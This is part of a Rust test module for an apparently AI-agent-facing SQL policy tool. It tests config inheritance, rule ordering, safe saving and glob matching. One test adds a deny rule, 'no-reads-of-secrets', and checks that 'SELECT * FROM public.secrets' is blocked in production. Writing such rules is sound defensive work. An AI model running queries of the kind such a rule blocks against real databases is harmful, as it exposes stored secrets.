        assert_eq!(
            policy
                .evaluate(&MatchContext {
                    statement: &stmt,
                    risk: &risk,
                    environment: Environment::Production,
                    agent: None,
                })
                .decision,
            Decision::Allow
        );
    }

    #[test]
    fn an_added_rule_wins_over_the_builtin_it_contradicts() {
        let config = load_from_str(
            r#"
            [[policies.production.rules]]
            name = "no-reads-of-secrets"
            action = "deny"
            when = { objects = ["public.secrets"] }
            "#,
        );
        let compiled = config.compile().unwrap();
        let policy = compiled.policy("production").unwrap();
        let stmt = analyze_statement("SELECT * FROM public.secrets");
        let risk = score(&stmt, &RiskInput::default());
        // "allow-reads" would otherwise have matched first.
        assert_eq!(
            policy
                .evaluate(&MatchContext {
                    statement: &stmt,
                    risk: &risk,
                    environment: Environment::Production,
                    agent: None,
                })
                .decision,
            Decision::Deny
        );
    }

    #[test]
    fn explicit_settings_still_override_the_builtin() {
        let config = load_from_str(
            r#"
            [policies.production]
            approvals_required = 3
            deny_unparsed = false
            "#,
        );
        let production = &config.policies["production"];
        assert_eq!(production.approvals_required, 3);
        assert!(!production.deny_unparsed);
        // Untouched settings came from the built-in.
        assert!(production.protect_managed_surfaces);
        assert!(!production.rules.is_empty());
    }

    #[test]
    fn a_policy_can_extend_another_by_name() {
        let config = load_from_str(
            r#"
            [policies.locked-down]
            extends = "production"
            approvals_required = 2
            "#,
        );
        let policy = &config.policies["locked-down"];
        assert_eq!(policy.approvals_required, 2);
        assert!(!policy.rules.is_empty(), "did not inherit rules");
        assert_eq!(policy.default, "deny");
    }

    #[test]
    fn a_config_with_no_policies_section_gets_the_builtins_exactly_once() {
        // A file that says nothing about policies is the common case. Serde
        // fills the absent table from Config::default(), which is the built-in
        // map, so inheritance has to leave those alone or every rule appears
        // twice.
        let expected = builtin_policies()["production"].rules.len();
        let config = load_from_str("[audit]\nstore_raw_sql = false\n");
        assert_eq!(config.policies["production"].rules.len(), expected);

        let names: Vec<&str> = config.policies["production"]
            .rules
            .iter()
            .map(|r| r.name.as_str())
            .collect();
        let mut unique = names.clone();
        unique.sort_unstable();
        unique.dedup();
        assert_eq!(names.len(), unique.len(), "duplicate rules: {names:?}");
    }

    #[test]
    fn saving_and_loading_does_not_duplicate_rules() {
        // The trap: `save` writes the resolved policy, rules and all. If
        // loading it back merged the built-in rules in again, the list would
        // double on every save, and a repeated save-and-restart cycle would
        // grow it without bound.
        let mut path = std::env::temp_dir();
        path.push(format!("supasafe-roundtrip-{}.toml", std::process::id()));

        let original = Config::default();
        let expected = original.policies["production"].rules.len();

        original.save(&path).unwrap();
        let once = Config::load(&path).unwrap();
        assert_eq!(once.policies["production"].rules.len(), expected);

        once.save(&path).unwrap();
        let twice = Config::load(&path).unwrap();
        assert_eq!(
            twice.policies["production"].rules.len(),
            expected,
            "rules multiplied across a save and load cycle"
        );

        // And the policy still behaves the same way.
        let compiled = twice.compile().unwrap();
        let policy = compiled.policy("production").unwrap();
        let stmt = analyze_statement("SELECT 1");
        let risk = score(&stmt, &RiskInput::default());
        assert_eq!(
            policy
                .evaluate(&MatchContext {
                    statement: &stmt,
                    risk: &risk,
                    environment: Environment::Production,
                    agent: None,
                })
                .decision,
            Decision::Allow
        );

        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn saving_leaves_no_temporary_file_behind() {
        // Bind-mounting a single config file into a container makes rename
        // fail with EBUSY, and an earlier version left a half-written
        // `.toml.tmp` sitting next to the real config every time somebody
        // pressed save.
        let mut dir = std::env::temp_dir();
        dir.push(format!("supasafe-save-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("supasafe.toml");

        Config::default().save(&path).unwrap();
        assert!(path.exists());

        let leftovers: Vec<_> = std::fs::read_dir(&dir)
            .unwrap()
            .filter_map(|e| e.ok())
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| n.ends_with(".tmp"))
            .collect();
        assert!(leftovers.is_empty(), "left behind: {leftovers:?}");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn saving_over_an_existing_file_replaces_it_cleanly() {
        let mut path = std::env::temp_dir();
        path.push(format!("supasafe-overwrite-{}.toml", std::process::id()));
        std::fs::write(&path, "# stale content that must not survive\n").unwrap();

        Config::default().save(&path).unwrap();
        let text = std::fs::read_to_string(&path).unwrap();
        assert!(!text.contains("stale content"));
        assert!(Config::load(&path).is_ok());

        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn saving_refuses_to_write_something_that_would_not_load() {
        let mut config = Config::default();
        config.policies.get_mut("production").unwrap().default = "maybe".into();
        let mut path = std::env::temp_dir();
        path.push(format!("supasafe-bad-{}.toml", std::process::id()));
        assert!(config.save(&path).is_err());
        assert!(!path.exists(), "an invalid config was written anyway");
    }

    #[test]
    fn rules_can_be_added_moved_and_removed() {
        let mut config = Config::default();
        let before = config.policies["production"].rules.len();

        let rule = Rule {
            name: "local".into(),
            action: "deny".into(),
            approvals: None,
            message: None,
            when: crate::policy::Matcher {
                objects: vec!["public.secrets".into()],
                ..Default::default()
            },
        };

        // New rules go to the front, because the first match wins.
        config.add_rule("production", rule, None).unwrap();
        assert_eq!(config.policies["production"].rules[0].name, "local");
        assert_eq!(config.policies["production"].rules.len(), before + 1);

        config.move_rule("production", 0, 3).unwrap();
        assert_eq!(config.policies["production"].rules[3].name, "local");

        let removed = config.remove_rule("production", 3).unwrap();
        assert_eq!(removed.name, "local");
        assert_eq!(config.policies["production"].rules.len(), before);
    }

    #[test]
    fn an_invalid_rule_is_rejected_before_it_is_stored() {
        let mut config = Config::default();
        let before = config.policies["production"].rules.len();
        let result = config.add_rule(
            "production",
            Rule {
                name: "broken".into(),
                action: "deny".into(),
                approvals: None,
                message: None,
                when: crate::policy::Matcher {
                    objects: vec!["[".into()],
                    ..Default::default()
                },
            },
            None,
        );
        assert!(result.is_err());
        // The bad rule must not be left behind in the policy.
        assert_eq!(config.policies["production"].rules.len(), before);
    }

    #[test]
    fn a_wholly_new_policy_stands_alone() {
        let config = load_from_str(
            r#"
            [policies.anything-goes]
            default = "allow"
            protect_managed_surfaces = false
            "#,
        );
        let policy = &config.policies["anything-goes"];
        assert_eq!(policy.default, "allow");
        assert!(policy.rules.is_empty());
    }

    #[test]
    fn host_globs_match_the_way_people_expect() {
        assert!(glob_match("db.*.supabase.co", "db.abc.supabase.co"));
        assert!(!glob_match("db.*.supabase.co", "db.abc.example.com"));
        assert!(glob_match("*.internal", "pg.internal"));
        assert!(glob_match("exact", "exact"));
        assert!(!glob_match("exact", "exactly"));
    }
}
